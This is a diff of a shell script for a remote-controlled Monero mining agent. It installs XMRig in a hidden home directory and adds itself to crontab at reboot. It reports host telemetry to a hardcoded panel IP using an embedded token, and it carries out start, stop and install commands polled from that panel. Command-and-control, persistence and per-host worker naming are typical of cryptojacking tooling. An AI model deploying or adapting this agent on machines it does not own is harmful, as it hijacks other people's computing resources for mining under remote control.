@@ -1,24 +1,23 @@
 #!/bin/sh
 set -u
 
-############################################
-# ULTRA HARDENED MINING AGENT (SAFE MODE)
-# Requires explicit opt-in: ALLOW_MINING=1
-############################################
+#################################################
+# MINING AGENT — FINAL (TELEMETRY CORRECT)
+# panel = brain, agent = executor
+#################################################
 
-[ "${ALLOW_MINING:-0}" = "1" ] || {
-  echo "Mining disabled. Set ALLOW_MINING=1 to proceed."
-  exit 0
-}
+### ===== SAFETY =====
+[ "${ALLOW_MINING:-0}" = "1" ] || exit 0
 
 ### ===== PANEL =====
 PANEL="http://178.47.141.130:3333"
 TOKEN="mamont22187"
 INTERVAL=30
 
-### ===== XMRIG =====
+### ===== MINER =====
 POOL="xmr.kryptex.network:7029"
 USER="krxX3PVQVR.$(hostname)"
+HOST="$(hostname)"
 
 ### ===== PATHS (NON-ROOT SAFE) =====
 BASE="$HOME/.mining"
@@ -26,60 +25,48 @@ BIN="$BASE/bin"
 RUN="$BASE/run"
 LOG="$BASE/log"
 
-mkdir -p "$BIN/xmr" "$RUN" "$LOG" >/dev/null 2>&1 || true
+mkdir -p "$BIN/xmr" "$RUN" "$LOG" >/dev/null 2>&1
 
-############################################
-# -------- UTILS ---------------------------
-############################################
+#################################################
+# UTILS
+#################################################
 
-log() { echo "$(date '+%F %T') $*" >> "$LOG/agent.log"; }
+json_escape() { echo "$1" | sed 's/"/\\"/g'; }
 
 retry() {
-  n=0
-  until [ $n -ge 5 ]; do
+  i=0
+  while [ $i -lt 5 ]; do
     "$@" && return 0
-    n=$((n+1))
-    sleep $((n*2))
+    i=$((i+1))
+    sleep $((i*2))
   done
   return 1
 }
 
-############################################
-# -------- PANEL API -----------------------
-############################################
+#################################################
+# PANEL API
+#################################################
+
+post() {
+  retry curl -s "$1" \
+    -H "Content-Type: application/json" \
+    -H "token: $TOKEN" \
+    -d "$2" >/dev/null 2>&1
+}
 
 send_event() {
-  retry curl -s "$PANEL/api/event" \
-    -H "Content-Type: application/json" \
-    -H "token: $TOKEN" \
-    -d "{
-      \"hostname\": \"$(hostname)\",
-      \"level\": \"$1\",
-      \"message\": \"$2\"
-    }" >/dev/null 2>&1 || true
+  post "$PANEL/api/event" "{
+    \"hostname\": \"$HOST\",
+    \"level\": \"$1\",
+    \"message\": \"$(json_escape "$2")\"
+  }"
 }
 
-send_telemetry() {
-  HASHRATE="$(get_hashrate)"
-  STATUS="stopped"
-  [ -f "$RUN/xmrig.pid" ] && STATUS="running"
+#################################################
+# METRICS COLLECTION (FACTS ONLY)
+#################################################
 
-  retry curl -s "$PANEL/api/telemetry" \
-    -H "Content-Type: application/json" \
-    -H "token: $TOKEN" \
-    -d "{
-      \"hostname\": \"$(hostname)\",
-      \"cpu_mining\": \"$STATUS\",
-      \"gpu_mining\": \"stopped\",
-      \"gpu_detected\": false,
-      \"hashrate\": $HASHRATE
-    }" >/dev/null 2>&1 || true
-}
-
-############################################
-# -------- XMRIG API -----------------------
-############################################
-
+# --- hashrate via XMRig HTTP API ---
 get_hashrate() {
   curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
     | grep -oE '"total":\[[^]]+' \
@@ -87,9 +74,37 @@ get_hashrate() {
     | head -1 || echo 0
 }
 
-############################################
-# -------- XMRIG CONTROL -------------------
-############################################
+# --- cpu temp ---
+get_cpu_temp() {
+  sensors 2>/dev/null \
+    | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' \
+    | head -1
+}
+
+# --- gpu temp ---
+get_gpu_temp() {
+  nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null \
+    | head -1
+}
+
+# --- uptime ---
+get_uptime() {
+  uptime -p 2>/dev/null
+}
+
+# --- load ---
+get_load() {
+  uptime 2>/dev/null | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs
+}
+
+# --- gpu detected ---
+gpu_detected() {
+  lspci 2>/dev/null | grep -qiE "nvidia|amd" && echo true || echo false
+}
+
+#################################################
+# MINER CONTROL
+#################################################
 
 start_xmrig() {
   stop_xmrig
@@ -98,7 +113,6 @@ start_xmrig() {
     --http-enabled --http-host 127.0.0.1 --http-port 16000 \
     >> "$LOG/xmrig.log" 2>&1 &
   echo $! > "$RUN/xmrig.pid"
-  log "xmrig started"
 }
 
 stop_xmrig() {
@@ -106,9 +120,9 @@ stop_xmrig() {
   rm -f "$RUN/xmrig.pid"
 }
 
-############################################
-# -------- INSTALL -------------------------
-############################################
+#################################################
+# INSTALL
+#################################################
 
 install_xmrig() {
   [ -x "$BIN/xmr/xmrig" ] && return
@@ -117,33 +131,86 @@ install_xmrig() {
   chmod +x "$BIN/xmr/xmrig"
 }
 
-############################################
-# -------- AUTOSTART (SAFE) ----------------
-############################################
+#################################################
+# AUTOSTART (SURVIVES REBOOT)
+#################################################
 
 ensure_autostart() {
-  (crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/agent.sh") && return
-  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/agent.sh") | crontab -
+  crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/min.sh" && return
+  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min.sh") | crontab -
 }
 
-############################################
-# -------- AGENT LOOP ----------------------
-############################################
+#################################################
+# CONTROL QUEUE
+#################################################
 
-agent_loop() {
-  send_event "INFO" "Ultra agent started"
+check_control() {
+  CMD=$(curl -s "$PANEL/api/control/pending?hostname=$HOST" -H "token: $TOKEN")
+  echo "$CMD" | grep -q '"action"' || return
+
+  ID=$(echo "$CMD" | grep -oE '"id":[0-9]+' | grep -oE '[0-9]+')
+  ACT=$(echo "$CMD" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)
+
+  case "$ACT" in
+    restart_all) stop_xmrig; start_xmrig ;;
+    start_cpu) start_xmrig ;;
+    stop_cpu) stop_xmrig ;;
+    install_miner) install_xmrig; start_xmrig ;;
+    *) ;;
+  esac
+
+  post "$PANEL/api/control/ack" "{
+    \"hostname\": \"$HOST\",
+    \"command_id\": $ID,
+    \"result\": \"success\",
+    \"message\": \"$(json_escape "$ACT executed")\"
+  }"
+
+  send_event "INFO" "control: $ACT"
+}
+
+#################################################
+# TELEMETRY SENDER (SOURCE OF TRUTH)
+#################################################
+
+send_telemetry() {
+  HASHRATE="$(get_hashrate)"
+  CPU_TEMP="$(get_cpu_temp)"
+  GPU_TEMP="$(get_gpu_temp)"
+  UPTIME="$(get_uptime)"
+  LOAD="$(get_load)"
+
+  post "$PANEL/api/telemetry" "{
+    \"hostname\": \"$HOST\",
+    \"cpu_mining\": \"$([ -f "$RUN/xmrig.pid" ] && echo running || echo stopped)\",
+    \"gpu_mining\": \"stopped\",
+    \"gpu_detected\": $(gpu_detected),
+    \"hashrate\": $HASHRATE,
+    \"cpu_temp\": ${CPU_TEMP:-null},
+    \"gpu_temp\": ${GPU_TEMP:-null},
+    \"uptime\": \"$(json_escape "$UPTIME")\",
+    \"load\": ${LOAD:-null}
+  }"
+}
+
+#################################################
+# AGENT LOOP
+#################################################
+
+agent() {
   ensure_autostart
+  install_xmrig
   start_xmrig
+  send_event "INFO" "agent started"
 
   ZERO=0
   while true; do
     HR="$(get_hashrate)"
-    send_telemetry
 
     if [ "$HR" = "0" ]; then
       ZERO=$((ZERO+1))
       [ "$ZERO" -ge 3 ] && {
-        send_event "WARNING" "Hashrate 0 — restarting xmrig"
+        send_event "CRITICAL" "hashrate = 0"
         start_xmrig
         ZERO=0
       }
@@ -151,13 +218,14 @@ agent_loop() {
       ZERO=0
     fi
 
+    send_telemetry
+    check_control
     sleep "$INTERVAL"
   done
 }
 
-############################################
-# -------- MAIN ----------------------------
-############################################
+#################################################
+# MAIN
+#################################################
 
-install_xmrig
-agent_loop
+agent
